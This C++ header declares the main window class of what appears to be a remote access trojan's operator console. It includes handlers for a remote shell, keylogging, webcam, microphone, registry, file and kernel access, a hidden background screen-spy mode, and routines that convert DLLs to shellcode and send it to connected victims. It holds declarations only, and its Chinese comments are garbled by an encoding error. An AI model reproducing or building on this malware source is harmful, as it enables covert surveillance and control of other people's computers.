// MainFrm.h : interface of the CMainFrame class
#pragma once

#include <map>
#include "MemoryModule.h"
#include "DllToShellCode.h"
#include "SEU_QQwry.h"
#include "TipCtrl.h"
#include "md5.h"

struct PluginsInfo
{
	TCHAR Version[50];
	BYTE* filedate;
	int filesize;
	BOOL bauto;
};

typedef void(__stdcall* fuBoxedAppSDK_SetContext)(LPCSTR szContext);
typedef BOOL(__stdcall* fuBoxedAppSDK_Init)();
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdkRawData)(PVOID pData, DWORD dwSize);
typedef void(__stdcall* fuBoxedAppSDK_Exit)();
typedef HANDLE(__stdcall* fuBoxedAppSDK_CreateVirtualFileW)(LPCWSTR szPath, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef DWORD(__stdcall* fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW)(LPCWSTR szPath);
typedef void(__stdcall* fuBoxedAppSDK_EnableOption)(DWORD dwOptionIndex, BOOL bEnable);
typedef void(__stdcall* fuBoxedAppSDK_RemoteProcess_EnableOption)(DWORD dwProcessId, DWORD dwOptionIndex, BOOL bEnable);
typedef BOOL(__stdcall* fuBoxedAppSDK_AttachToProcess)(HANDLE hProcess);
typedef BOOL(__stdcall* fuBoxedAppSDK_DetachFromProcess)(HANDLE hProcess);
typedef void(__stdcall* fuBoxedAppSDK_EmulateBoxedAppSDKDLL)();
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdk64DllPathW)(LPCWSTR szPath);
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdk32DllPathW)(LPCWSTR szPath);
typedef void(__stdcall* fuBoxedAppSDK_EnableDebugLog)(BOOL bEnable);

typedef std::map<CString, PluginsInfo*> PluginsDate; //��Ų������

class CMainFrame : public CXTPFrameWnd
{
private:
	HMEMORYMODULE handle;
	fuBoxedAppSDK_SetContext MyBoxedAppSDK_SetContext;
	fuBoxedAppSDK_Init MyBoxedAppSDK_Init;
	fuBoxedAppSDK_SetBxSdkRawData MyBoxedAppSDK_SetBxSdkRawData;
	fuBoxedAppSDK_Exit MyBoxedAppSDK_Exit;
	fuBoxedAppSDK_CreateVirtualFileW MyBoxedAppSDK_CreateVirtualFileW;
	fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW MyBoxedAppSDK_DeleteFileFromVirtualFileSystemW;
	fuBoxedAppSDK_EnableOption MyBoxedAppSDK_EnableOption;
	fuBoxedAppSDK_RemoteProcess_EnableOption MyBoxedAppSDK_RemoteProcess_EnableOption;
	fuBoxedAppSDK_AttachToProcess MyBoxedAppSDK_AttachToProcess;
	fuBoxedAppSDK_DetachFromProcess MyBoxedAppSDK_DetachFromProcess;
	fuBoxedAppSDK_EmulateBoxedAppSDKDLL MyBoxedAppSDK_EmulateBoxedAppSDKDLL;
	fuBoxedAppSDK_SetBxSdk64DllPathW MyBoxedAppSDK_SetBxSdk64DllPathW;
	fuBoxedAppSDK_SetBxSdk32DllPathW MyBoxedAppSDK_SetBxSdk32DllPathW;
	fuBoxedAppSDK_EnableDebugLog MyBoxedAppSDK_EnableDebugLog;
	BOOL BoxedAppSDK_Init_IsOK;
protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)

	// Attributes
public:


	CXTPStatusBar  m_wndStatusBar;

	CXTPStatusBarPane* pPaneW;
	CXTPStatusBarSliderPane* pZoomPaneW;
	int m_nZoom_w;
	CXTPStatusBarPane* pPaneH;
	CXTPStatusBarSliderPane* pZoomPaneH;
	int m_nZoom_h;
	CXTPStatusBarPane* pPaneF;
	CXTPStatusBarSliderPane* pZoomPaneF;
	int m_nZoom_f;

	CCoolTipCtrl m_wndTip; //��ʾ����
	SEU_QQwry* m_gQQwry ;

public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	CXTPDockingPane* CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour = NULL);

	static void CALLBACK NotifyProc( ClientContext* pContext, UINT nCode);
	 void ProcessReceiveComplete(ClientContext* pContext);
	 void ProcessReceive(ClientContext* pContext);
	 void ProcessSendShellcode(ClientContext* pContext,int i);
	// Implementation
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif
	
	void FindBestPosition(CXTPPopupControl* pPopup, CSize szPopup);
	BOOL adddCXTPToolBar();//��ӹ�����
	CDialogBar* CreatewndFilterEdit();
	
	void showStatusBar(BOOL bshow);
	void OnButton_Monitor_W();
	void OnZoomSliderScroll_W(NMHDR* pNMHDR, LRESULT* pResult);
	void OnButton_Monitor_H();
	void OnZoomSliderScroll_H(NMHDR* pNMHDR, LRESULT* pResult);
	void OnButton_Monitor_F();
	void OnZoomSliderScroll_F(NMHDR* pNMHDR, LRESULT* pResult);



	void Activate();
	void initializeSEU_QQwry(); //��ʼ��IP��λSDK
	void InitShellcode(); //��ʼ��shellcode32
	void WriteResource(bool iswin64,TCHAR* lp_path, TCHAR* lp_filename, int lpszType, TCHAR* lpresname,bool bwrite, bool buildshellcode=false, char* param="0");//д����Դ�ļ�������Ŀ¼
	void WriteandReadPlugins();//д�����
	void GetPluginVersion(TCHAR* dllname,TCHAR* Version, SENDTASK sendtask,BOOL bisx86); //��ȡ����汾
	void ShowConnects();//��ʾ��������
	void OnOpenDesktop(ClientContext* pContext);						//��ʾ��ͼ
	void OnOpenSendVersion(ClientContext* pContext);					//���Ͱ汾
	void OnOpenSendDll(ClientContext* pContext);						//���Ͳ��
	void SendAutoDll(ClientContext* pContext);						//����ֻ��Ҫ���ص�DLL
protected:  // control bar embedded members
	
	
 	CXTPDockingPaneManager m_paneManager;
	CXTPDockingPane* pwndPanelist;
	CXTPDockingPane* pwndPanemonitor;
	CXTPDockingPane* pwndPaneLog;
	CXTPDockingPane* pwndPanePlug;
	CXTPDockingPane* pwndPaneBuild;
	//CXTPDockingPane* pwndPaneChart;
	//CXTPDockingPane* pwndPaneDDOS;
	CMap<UINT, UINT, CWnd*, CWnd*> m_mapPanes;
	SIZE m_sizePopup;
	CPoint m_ptPopup;
	CList<CXTPPopupControl*, CXTPPopupControl*> m_lstPopupControl;


	CXTPTrayIcon m_TrayIcon; //���½����������ͼ�� ��ʾ��
	TCHAR m_key[30]; //�ȼ�
	PluginsDate m_PluginsDate_x86;  //�������
	PluginsDate m_PluginsDate_x64;  //�������
	int bAddListen;				//�жϼ����Ƿ�ɹ�
	PVOID Shellcode32;
	int ShellcodeSize32;
	PVOID Shellcode64;
	int ShellcodeSize64;
	HANDLE	hFile; //QQwry
	bool bbusy;
	
// Generated message map functions
protected:
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnClose();
	afx_msg void OnMenuitemShow();
	afx_msg void OnLockButton();
	afx_msg void OnHiddenButton();

	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);   //ϵͳ�˵���Ϣ
	afx_msg LRESULT OnOpenDestopPopup(WPARAM wParam, LPARAM lParam);//��������
	afx_msg LRESULT OnPopUpNotify(WPARAM wParam, LPARAM lParam);//�������ڵ���Ϣ
	afx_msg LRESULT OnDockingPaneNotify(WPARAM wParam, LPARAM lParam);
	DECLARE_MESSAGE_MAP()


protected:

	afx_msg LRESULT OnOpenshelldialog(WPARAM wParam, LPARAM lParam);						//�ն˹���
	afx_msg LRESULT OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam);						//����
	afx_msg LRESULT OnOpenregeditdialog(WPARAM wParam, LPARAM lParam);						//ע���
	afx_msg LRESULT OnOpenproxydialog(WPARAM wParam, LPARAM lParam);						//����
	afx_msg LRESULT OnOpenchatdialog(WPARAM wParam, LPARAM lParam);							//Զ�̽�̸
	afx_msg LRESULT OnOpenaudiodialog(WPARAM wParam, LPARAM lParam);						//��˷�
	afx_msg LRESULT OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam);						//�ļ�����
	afx_msg LRESULT OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam);						//����ͷ
	afx_msg LRESULT OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam);						//������
	afx_msg LRESULT OnOpensysinfodialog(WPARAM wParam, LPARAM lParam);						//��������
	afx_msg LRESULT OnOpenkerneldialog(WPARAM wParam, LPARAM lParam);						//�������
	afx_msg LRESULT OnOpenexpanddialog(WPARAM wParam, LPARAM lParam);						//�������
	afx_msg LRESULT OnOpencreenspydialog_dif(WPARAM wParam, LPARAM lParam);					//������Ļ
	afx_msg LRESULT OnOpencreenspydialog_quick(WPARAM wParam, LPARAM lParam);				//������Ļ
	afx_msg LRESULT OnOpencreenspydialog_play(WPARAM wParam, LPARAM lParam);				//������Ļ
	afx_msg LRESULT OnOpencreenspydialog_hide(WPARAM wParam, LPARAM lParam);				//��̨��Ļ




};

